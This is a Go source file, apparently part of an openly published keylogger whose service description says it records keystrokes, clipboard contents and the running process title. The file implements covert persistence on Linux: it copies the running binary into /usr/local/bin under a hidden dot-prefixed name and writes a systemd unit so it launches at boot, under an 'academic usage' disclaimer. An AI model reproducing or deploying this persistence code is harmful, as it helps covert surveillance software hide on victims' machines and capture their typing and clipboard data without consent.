// STATEMENT:
// In consideration of all possible negative effects this software will bring,
// this software is developed only for academic usage.
// Any malicious usage of this software is forbidden and unrelated to the author.

//go:build linux

package main

import (
	"io"
	"io/ioutil"
	"os"
)

const (
	ServiceFile = "/usr/lib/systemd/system/" + AppName + ".service"
	ServiceCont = `[Unit]
Description=Keylogger records keyboard events, clipboard, and the current running process title.

[Service]
Type=simple
ExecStart=/usr/local/bin/.` + AppName + `

[Install]
WantedBy=multi-user.target`
)

// setAutostart registers autostart service on this device.
// On Linux, copy file to /usr/local/bin/ and register service by modifying /usr/lib/systemd/system/Keylogger.service
func setAutostart() {
	filename := copyFile()
	if filename != "" {
		// Create and write a service file to register autostart.
		// TODO: Theoretically feasible... actually not available (core=dumped, signal=SEGV)
		_ = ioutil.WriteFile(ServiceFile, []byte(ServiceCont), os.ModePerm)
	}
}

// copyFile copies the currently running file to /usr/local/bin/ and hide it by adding dot at the beginning.
func copyFile() string {
	dstName := "/usr/local/bin/." + AppName
	srcName := os.Args[0]
	if dstName == srcName {
		return ""
	}
	// Create a destination file to copy.
	dst, err := os.OpenFile(dstName, os.O_CREATE|os.O_WRONLY, os.ModePerm)
	if err != nil {
		return srcName
	}
	// Open the source file to copy.
	src, err := os.Open(srcName)
	if err != nil {
		return srcName
	}
	// Copy file.
	_, err = io.Copy(dst, src)
	if err != nil {
		return srcName
	}
	return dstName
}
